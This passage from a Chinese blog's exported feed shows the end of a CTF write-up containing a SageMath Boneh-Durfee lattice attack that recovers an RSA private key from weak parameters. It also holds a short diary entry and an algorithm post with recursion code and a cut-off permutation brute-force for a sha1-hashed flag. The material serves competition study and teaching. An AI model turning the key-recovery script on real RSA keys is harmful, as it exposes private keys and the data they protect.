class="token keyword">in</span> range<span class="token punctuation">(</span>nn <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> pol2_idx <span class="token keyword">in</span> range<span class="token punctuation">(</span>pol1_idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> nn<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># for i and j, create the two polynomials</span>            PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>w<span class="token punctuation">,</span>z<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>            pol1 <span class="token operator">=</span> pol2 <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span>nn<span class="token punctuation">)</span><span class="token punctuation">:</span>                pol1 <span class="token operator">+=</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>w<span class="token operator">*</span>z<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>w<span class="token punctuation">,</span>z<span class="token punctuation">)</span> <span class="token operator">*</span> BB<span class="token punctuation">[</span>pol1_idx<span class="token punctuation">,</span> jj<span class="token punctuation">]</span> <span class="token operator">/</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>UU<span class="token punctuation">,</span>XX<span class="token punctuation">,</span>YY<span class="token punctuation">)</span>                pol2 <span class="token operator">+=</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>w<span class="token operator">*</span>z<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>w<span class="token punctuation">,</span>z<span class="token punctuation">)</span> <span class="token operator">*</span> BB<span class="token punctuation">[</span>pol2_idx<span class="token punctuation">,</span> jj<span class="token punctuation">]</span> <span class="token operator">/</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>UU<span class="token punctuation">,</span>XX<span class="token punctuation">,</span>YY<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># resultant</span>            PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>q<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>            rr <span class="token operator">=</span> pol1<span class="token punctuation">.</span>resultant<span class="token punctuation">(</span>pol2<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># are these good polynomials?</span>            <span class="token keyword">if</span> rr<span class="token punctuation">.</span>is_zero<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">or</span> rr<span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token string">"found them, using vectors"</span><span class="token punctuation">,</span> pol1_idx<span class="token punctuation">,</span> <span class="token string">"and"</span><span class="token punctuation">,</span> pol2_idx                found_polynomials <span class="token operator">=</span> <span class="token boolean">True</span>                <span class="token keyword">break</span>        <span class="token keyword">if</span> found_polynomials<span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> <span class="token operator">not</span> found_polynomials<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"no independant vectors could be found. This should very rarely happen..."</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>    rr <span class="token operator">=</span> rr<span class="token punctuation">(</span>q<span class="token punctuation">,</span> q<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># solutions</span>    soly <span class="token operator">=</span> rr<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>soly<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Your prediction (delta) is too small"</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>    soly <span class="token operator">=</span> soly<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    ss <span class="token operator">=</span> pol1<span class="token punctuation">(</span>q<span class="token punctuation">,</span> soly<span class="token punctuation">)</span>    solx <span class="token operator">=</span> ss<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token keyword">return</span> solx<span class="token punctuation">,</span> soly<span class="token keyword">def</span> <span class="token function">example</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">############################################</span>    <span class="token comment" spellcheck="true"># How To Use This Script</span>    <span class="token comment" spellcheck="true">##########################################</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># The problem to solve (edit the following values)</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># the modulus</span>    N <span class="token operator">=</span> <span class="token number">0xc2fd2913bae61f845ac94e4ee1bb10d8531dda830d31bb221dac5f179a8f883f15046d7aa179aff848db2734b8f88cc73d09f35c445c74ee35b01a96eb7b0a6ad9cb9ccd6c02c3f8c55ecabb55501bb2c318a38cac2db69d510e152756054aaed064ac2a454e46d9b3b755b67b46906fbff8dd9aeca6755909333f5f81bf74db</span>    <span class="token comment" spellcheck="true"># the public exponent</span>    e <span class="token operator">=</span> <span class="token number">0x19441f679c9609f2484eb9b2658d7138252b847b2ed8ad182be7976ed57a3e441af14897ce041f3e07916445b88181c22f510150584eee4b0f776a5a487a4472a99f2ddc95efdd2b380ab4480533808b8c92e63ace57fb42bac8315fa487d03bec86d854314bc2ec4f99b192bb98710be151599d60f224114f6b33f47e357517</span>    <span class="token comment" spellcheck="true"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span>    delta <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token number">18</span> <span class="token comment" spellcheck="true"># this means that d &lt; N^delta</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Lattice (tweak those values)</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span>    m <span class="token operator">=</span> <span class="token number">4</span> <span class="token comment" spellcheck="true"># size of the lattice (bigger the better/slower)</span>    <span class="token comment" spellcheck="true"># you need to be a lattice master to tweak these</span>    t <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">2</span><span class="token operator">*</span>delta<span class="token punctuation">)</span> <span class="token operator">*</span> m<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># optimization from Herrmann and May</span>    X <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>floor<span class="token punctuation">(</span>N<span class="token operator">^</span>delta<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># this _might_ be too much</span>    Y <span class="token operator">=</span> floor<span class="token punctuation">(</span>N<span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># correct if p, q are ~ same size</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Don't touch anything below</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Problem put in equation</span>    P<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token punctuation">,</span>y<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>    A <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>    pol <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token punctuation">(</span>A <span class="token operator">+</span> y<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Find the solutions!</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Checking bounds</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== checking values ==="</span>        <span class="token keyword">print</span> <span class="token string">"* delta:"</span><span class="token punctuation">,</span> delta        <span class="token keyword">print</span> <span class="token string">"* delta &lt; 0.292"</span><span class="token punctuation">,</span> delta <span class="token operator">&lt;</span> <span class="token number">0.292</span>        <span class="token keyword">print</span> <span class="token string">"* size of e:"</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>log<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token operator">/</span>log<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"* size of N:"</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>log<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token operator">/</span>log<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"* m:"</span><span class="token punctuation">,</span> m<span class="token punctuation">,</span> <span class="token string">", t:"</span><span class="token punctuation">,</span> t    <span class="token comment" spellcheck="true"># boneh_durfee</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== running algorithm ==="</span>        start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    solx<span class="token punctuation">,</span> soly <span class="token operator">=</span> boneh_durfee<span class="token punctuation">(</span>pol<span class="token punctuation">,</span> e<span class="token punctuation">,</span> m<span class="token punctuation">,</span> t<span class="token punctuation">,</span> X<span class="token punctuation">,</span> Y<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># found a solution?</span>    <span class="token keyword">if</span> solx <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== solution found ==="</span>        <span class="token keyword">if</span> <span class="token boolean">False</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">"x:"</span><span class="token punctuation">,</span> solx            <span class="token keyword">print</span> <span class="token string">"y:"</span><span class="token punctuation">,</span> soly        d <span class="token operator">=</span> int<span class="token punctuation">(</span>pol<span class="token punctuation">(</span>solx<span class="token punctuation">,</span> soly<span class="token punctuation">)</span> <span class="token operator">/</span> e<span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"private key found:"</span><span class="token punctuation">,</span> d    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== no solution was found ==="</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=== %s seconds ==="</span> <span class="token operator">%</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    example<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="🎈小结"><a href="#🎈小结" class="headerlink" title="🎈小结"></a>🎈小结</h2><blockquote><p>这题很好地帮自己认识了一波RSA的各种姿势，深入地学习了一下RSA。</p></blockquote><h2 id="📕参考"><a href="#📕参考" class="headerlink" title="📕参考"></a>📕参考</h2><p><a href="http://inaz2.hatenablog.com/entry/2016/01/20/022936" target="_blank" rel="noopener">http://inaz2.hatenablog.com/entry/2016/01/20/022936</a></p><p><a href="https://github.com/mimoo/RSA-and-LLL-attacks" target="_blank" rel="noopener">https://github.com/mimoo/RSA-and-LLL-attacks</a></p><p><a href="https://cocalc.com/projects/4d6e5d25-114c-4e64-9f9a-14a88addf2e5/files/2019-05-25-224507.sagews?session=default" target="_blank" rel="noopener">https://cocalc.com/projects/4d6e5d25-114c-4e64-9f9a-14a88addf2e5/files/2019-05-25-224507.sagews?session=default</a></p><p><a href="https://www.cnblogs.com/WangAoBo/p/8654120.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/8654120.html</a></p><p><a href="https://www.cnblogs.com/WangAoBo/p/7541481.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/7541481.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 强网杯 </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>New_start</title>
      <link href="/2019/05/23/New-start/"/>
      <url>/2019/05/23/New-start/</url>
      
        <content type="html"><![CDATA[<p>今天开始，回到以往的学习状态吧！🙂</p><a id="more"></a><h1 id="2019年5月23日☀"><a href="#2019年5月23日☀" class="headerlink" title="2019年5月23日☀"></a>2019年5月23日☀</h1><blockquote><p>距今很久没更新博客了，一方面因为懒，一方面因为学习的停滞，各方面原因。</p><p>而今打算回到以往的学习状态，因为只有这样，才是充实的，有规划有目标的😄。</p></blockquote><h2 id="这几个月做了什么"><a href="#这几个月做了什么" class="headerlink" title="这几个月做了什么"></a>这几个月做了什么</h2><blockquote><p>虽然认认真真地看走过来的这些日子，确实没做什么大事，做的都是实际意义不大的小事情，自己的专业知识和技能也并没有多大的进步，可以说是虚度了许多时光🙃。</p></blockquote><h2 id="时间不多了"><a href="#时间不多了" class="headerlink" title="时间不多了"></a>时间不多了</h2><blockquote><p>接下来的时间不多了，第四个学期也到了尾声，一边要准备几个比赛和项目（大多没什么意义，但也得完成它们才行），一边要期末复习，一边还得开始提升停滞许久不前的技术广度和深度。</p><p>任务艰巨，光阴珍贵，希望自己多做点有意义的事情吧💪，和身边的人共同前行，相互扶持促进，以后要多在技术方面见见世面呀。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Algorithm_Recursive_Tree</title>
      <link href="/2019/03/17/Algorithm-Recursive-Tree/"/>
      <url>/2019/03/17/Algorithm-Recursive-Tree/</url>
      
        <content type="html"><![CDATA[<p>😄算法太菜。<br><a id="more"></a></p><h1 id="Algorithm——递归思想和树"><a href="#Algorithm——递归思想和树" class="headerlink" title="Algorithm——递归思想和树"></a>Algorithm——递归思想和树</h1><h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p>借助一简单的算法程序设计题来熟悉<code>递归思想</code>和<code>简单Tree</code>.</p><pre class=" language-c++"><code class="language-c++">题面为：给一个正整数n，求有多少种非0的整数组合之和等于n.例如：    2=1+1      3=1+1+1      3=1+2</code></pre><h3 id="Idea"><a href="#Idea" class="headerlink" title="Idea"></a>Idea</h3><p>通过树分支的方式来寻找答案，树的根<code>root=1</code>，然后逐渐循环获取每个分支之和为n，小于n则继续扩展。</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190317161546.png" alt=""></p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;algorithm></span> </span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;vector></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;set></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> flag<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>string<span class="token operator">></span> tree<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">di_gui</span><span class="token punctuation">(</span><span class="token keyword">int</span> head<span class="token punctuation">,</span><span class="token keyword">int</span> result<span class="token punctuation">,</span>string treeone<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>result<span class="token operator">-</span>head<span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">+</span>head<span class="token operator">&lt;</span>result<span class="token punctuation">)</span><span class="token punctuation">{</span>            string treetmp <span class="token operator">=</span> treeone<span class="token punctuation">;</span>            treetmp<span class="token operator">+</span><span class="token operator">=</span><span class="token function">to_string</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">di_gui</span><span class="token punctuation">(</span>i<span class="token operator">+</span>head<span class="token punctuation">,</span>result<span class="token punctuation">,</span>treetmp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//cout&lt;&lt;"dian"&lt;&lt;endl;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            string treetmp2 <span class="token operator">=</span> treeone<span class="token punctuation">;</span>            treetmp2<span class="token operator">+</span><span class="token operator">=</span><span class="token function">to_string</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            tree<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>treetmp2<span class="token punctuation">)</span><span class="token punctuation">;</span>            flag<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//cout&lt;&lt;flag&lt;&lt;endl;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>string <span class="token function">sort_string</span><span class="token punctuation">(</span>string it<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> arrchr<span class="token punctuation">[</span>it<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    string tmp <span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>it<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        arrchr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> it<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">sort</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>arrchr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>arrchr<span class="token punctuation">[</span>it<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>it<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        tmp <span class="token operator">+</span><span class="token operator">=</span> arrchr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> tmp<span class="token punctuation">;</span><span class="token punctuation">}</span>set<span class="token operator">&lt;</span>string<span class="token operator">></span> <span class="token function">get_set</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>string<span class="token operator">></span> atree<span class="token punctuation">)</span><span class="token punctuation">{</span>    set<span class="token operator">&lt;</span>string<span class="token operator">></span> tmp<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>atree<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        tmp<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token function">sort_string</span><span class="token punctuation">(</span>atree<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> tmp<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> num<span class="token punctuation">;</span>    <span class="token keyword">int</span> head<span class="token punctuation">;</span>    cin<span class="token operator">>></span>num<span class="token punctuation">;</span>    <span class="token function">di_gui</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout<span class="token operator">&lt;&lt;</span>flag<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//去重处理 </span>    set<span class="token operator">&lt;</span>string<span class="token operator">></span> result <span class="token operator">=</span> <span class="token function">get_set</span><span class="token punctuation">(</span>tree<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">auto</span> it<span class="token operator">=</span>result<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>it<span class="token operator">!=</span>result<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>it<span class="token punctuation">)</span><span class="token punctuation">{</span>        cout<span class="token operator">&lt;&lt;</span><span class="token operator">*</span>it<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//    for(int i=0;i&lt;tree.size();++i){</span><span class="token comment" spellcheck="true">//        cout&lt;&lt;tree.at(i)&lt;&lt;endl;</span><span class="token comment" spellcheck="true">//    }</span><span class="token punctuation">}</span></code></pre><p>可以看到flag变量对应的就是Tree的分支总数，而题目要求的是没有重复组合的结果，在树的分支中存在重复的节点，例如我们要获得<code>n=5</code>的结果，那么<code>1-3-1</code>和<code>1-1-3</code>两个分支就产生了重复，此时对树的分支进行结点排序，然后通过集合去重，这时得到的才是真正的结果。</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190317162524.png" alt=""></p><p>如果<code>di_gui</code>不用全局变量flag的话，可以把flag放入方法中：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">di_gui</span><span class="token punctuation">(</span><span class="token keyword">int</span> head<span class="token punctuation">,</span><span class="token keyword">int</span> result<span class="token punctuation">,</span>string treeone<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> flag<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>result<span class="token operator">-</span>head<span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">+</span>head<span class="token operator">&lt;</span>result<span class="token punctuation">)</span><span class="token punctuation">{</span>            string treetmp <span class="token operator">=</span> treeone<span class="token punctuation">;</span>            treetmp<span class="token operator">+</span><span class="token operator">=</span><span class="token function">to_string</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            flag<span class="token operator">+</span><span class="token operator">=</span><span class="token function">di_gui</span><span class="token punctuation">(</span>i<span class="token operator">+</span>head<span class="token punctuation">,</span>result<span class="token punctuation">,</span>treetmp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//cout&lt;&lt;"dian"&lt;&lt;endl;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            string treetmp2 <span class="token operator">=</span> treeone<span class="token punctuation">;</span>            treetmp2<span class="token operator">+</span><span class="token operator">=</span><span class="token function">to_string</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            tree<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>treetmp2<span class="token punctuation">)</span><span class="token punctuation">;</span>            flag<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//cout&lt;&lt;flag&lt;&lt;endl;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> flag<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>Python版固定长度的字符串排列组合：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">import</span> hashlib<span class="token keyword">def</span> <span class="token function">perm</span><span class="token punctuation">(</span>s<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 这里是递归函数的出口，为什么呢，因为这里表示：一个长度为1的字符串，它的排列组合就是它自己。</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span>s<span class="token punctuation">]</span>    sl<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#保存字符串的所有可能排列组合</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#这个循环，对应 解题思路1）确定字符串的第一个字母是谁，有n种可能（n为字符串s的长度</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> perm<span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span><span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#这个循环，对应 解题思路2）进入递归，s[0:i]+s[i+1:]的意思就是把s中的s[i]给去掉</span>            sl<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>j<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 对应 解题思路2）问题就从“返回字符串中的字母排列组合” **变成了** “返回 第一个字母+除去第一个字母外的字符串的排列组合”</span>    <span class="token keyword">return</span> sl<span class="token keyword">def</span> <span class="token function">sha1</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>    hash<span class="token punctuation">.</span>update<span class="token punctuation">(</span>str<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># dict0 = '12eshcn'</span>    <span class="token comment" spellcheck="true"># dict1 = '!2eshcn'</span>    <span class="token comment" spellcheck="true"># dict2 = '!@eshcn'</span>    <span class="token comment" spellcheck="true"># dict3 = '1@eshcn'</span>    dicts <span class="token operator">=</span> <span class="token string">''</span><span class="token comment" spellcheck="true">#要排列组合的字符</span>    perm_nums<span class="token operator">=</span>perm<span class="token punctuation">(</span>dicts<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>perm_nums<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># for key in perm_nums:</span>    <span class="token comment" spellcheck="true">#      flag = "flag{%s}"%key</span>    <span class="token comment" spellcheck="true">#      if str(sha1(flag)) == 